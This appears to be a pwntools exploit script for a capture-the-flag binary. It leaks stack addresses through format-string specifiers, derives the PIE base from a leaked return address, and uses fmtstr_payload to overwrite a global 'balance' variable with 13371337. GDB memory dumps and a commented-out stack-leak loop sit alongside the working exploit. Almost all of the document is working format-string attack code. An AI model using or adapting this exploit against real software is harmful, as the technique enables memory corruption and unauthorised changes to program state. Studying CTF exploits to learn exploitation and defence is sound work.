from pwn import *

elf = ELF('chal')
context.arch = 'amd64'
context.log_level = 'error'
'''GDB
0x7fffffffdc80: 0x00007fffffffde08      0x00005555555552e7
0x7fffffffdc90: 0x4141414141414141      0x4141414141414141
0x7fffffffdca0: 0x4141414141414141      0x0041414141414141
0x7fffffffdcb0: 0x4242424242424242      0x4242424242424242
0x7fffffffdcc0: 0x4242424242424242      0x0042424242424242
0x7fffffffdcd0: 0x0000000000000000      0xdc4a1643c9b47300
0x7fffffffdce0: 0x0000000000000001      0x00007ffff7c29f68
0x7fffffffdcf0: 0x0000000000000000      0x00005555555551c9
0x7fffffffdd00: 0x00000001ffffdde0      0x00007fffffffddf8

0x0000555555558010  balance
'''
balance_offset = 0x0000555555558010
return_addr_offset = 0x00005555555551c9

''' # Leak stack :O
for i in range(1, 41):
	p = process('chal')
	payload = f'%{i}$p'
	payload = 'A'*24+payload
	p.sendline(b'B'*31)
	p.sendline(payload.encode())
	p.recvuntil(b'Invalid voucher code: ')
	result = p.recvline().decode().strip()
	print(f'%{i}$p : {result[24:]}')
	
	#if '4141414141414141' in result:
	#	print(f'Found 0x4141414141414141 in {i}')
	p.close()'''

# Found 0x4141414141414141 in 6
# Found 0x4141414141414141 in 10

offset_name = 6
offset_voucher = 10

p = process('chal')
payload = f'%19$p'
p.sendline(payload.encode())
p.recvuntil(b'Welcome, ')
return_addr = p.recvuntil(b'.', drop=True).decode().strip()
return_addr = int(return_addr, 16)

print(hex(return_addr))
base = return_addr - return_addr_offset

payload = fmtstr_payload(offset_voucher, {balance_offset+base : 13371337}, write_size='int')
p.sendline(payload)
p.interactive()
